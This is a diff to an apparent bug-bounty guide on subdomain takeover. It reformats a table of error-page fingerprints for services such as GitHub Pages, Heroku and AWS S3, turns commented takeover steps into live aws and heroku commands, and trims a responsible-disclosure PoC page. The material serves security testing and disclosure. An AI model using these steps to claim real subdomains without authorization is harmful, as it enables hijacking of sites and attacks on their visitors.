@@ -38,20 +38,29 @@ dig CNAME dev.target.com
 
 ## Fingerprints by Service
 
-| Service | Fingerprint |
-|---------|-------------|
-| GitHub Pages | `There isn't a GitHub Pages site here` |
-| Heroku | `No such app` |
-| AWS S3 | `NoSuchBucket` |
-| Azure | `404 Web Site not found` |
-| Shopify | `Sorry, this shop is currently unavailable` |
-| Fastly | `Fastly error: unknown domain` |
-| Tumblr | `There's nothing here` |
-| UserVoice | `This UserVoice subdomain is currently available` |
-| Ghost | `The thing you were looking for is no longer here` |
-| Bitbucket | `Repository not found` |
-| Zendesk | `Help Center Closed` |
-| Desk.com | `Sorry, We Couldn't Find That Page` |
+**GitHub Pages** — `There isn't a GitHub Pages site here`
+
+**Heroku** — `No such app`
+
+**AWS S3** — `NoSuchBucket`
+
+**Azure** — `404 Web Site not found`
+
+**Shopify** — `Sorry, this shop is currently unavailable`
+
+**Fastly** — `Fastly error: unknown domain`
+
+**Tumblr** — `There's nothing here`
+
+**UserVoice** — `This UserVoice subdomain is currently available`
+
+**Ghost** — `The thing you were looking for is no longer here`
+
+**Bitbucket** — `Repository not found`
+
+**Zendesk** — `Help Center Closed`
+
+**Desk.com** — `Sorry, We Couldn't Find That Page`
 
 ---
 
@@ -59,21 +68,19 @@ dig CNAME dev.target.com
 
 ```bash
 # GitHub Pages takeover
-# 1. Create repo: attacker-gh-username/takeover-poc
+# 1. Create repo: your-username/takeover-poc
 # 2. Add CNAME file containing: vuln.target.com
-# 3. Enable GitHub Pages in settings
-# 4. Create index.html with: "subdomain-takeover-poc"
-# 5. Verify: curl https://vuln.target.com → returns your page
+# 3. Enable GitHub Pages in repo settings
+# 4. Create index.html: "subdomain-takeover-poc"
+# 5. Verify: curl https://vuln.target.com
 
 # AWS S3 takeover
-# 1. Create bucket with exact name from CNAME
-# aws s3api create-bucket --bucket exact-bucket-name --region us-east-1
-# 2. Upload index.html with poc content
-# 3. Make bucket public
+aws s3api create-bucket --bucket exact-bucket-name --region us-east-1
+# Upload index.html → make bucket public
 
 # Heroku takeover
-# heroku create exact-app-name
-# Add custom domain: heroku domains:add vuln.target.com
+heroku create exact-app-name
+heroku domains:add vuln.target.com
 ```
 
 ---
@@ -87,7 +94,7 @@ dig CNAME dev.target.com
 <head><title>Subdomain Takeover PoC</title></head>
 <body>
   <h1>Subdomain Takeover - PoC</h1>
-  <p>This page demonstrates that <strong>vuln.target.com</strong> 
+  <p>This page demonstrates that <strong>vuln.target.com</strong>
   is vulnerable to subdomain takeover by @su6osec.</p>
   <p>No harm was caused. Reported responsibly.</p>
 </body>
